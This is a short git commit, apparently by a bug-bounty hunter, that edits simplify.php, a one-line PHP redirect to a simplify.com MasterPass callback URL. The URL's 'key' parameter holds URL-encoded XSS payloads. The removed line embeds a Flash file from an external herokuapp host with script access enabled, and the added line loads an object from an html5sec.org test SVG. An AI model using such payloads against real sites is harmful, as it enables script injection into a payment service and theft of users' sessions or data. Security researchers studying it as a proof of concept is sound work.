9639a81578d8e039ca7855eb761ae252279470f8
missoum1307 <missoum1307@users.noreply.github.com>
2018-01-09 23:01:18 +0100

    Update simplify.php

--- simplify.php
+++ simplify.php
@@ -1,4 +1,4 @@
-<?php header('location: https://simplify.com/commerce/masterPass/callbackHandler?key=%3C?PXML%3E%3Chtml:embed%20allowscriptaccess=always%20src=//bughunt1307.herokuapp.com/xss.swf%3E
+<?php header('location: https://simplify.com/commerce/masterPass/callbackHandler?key=%3C?PXML%3E%3Chtml:object%20data=https://html5sec.org/test.svg%3E
 ')?>
 
 
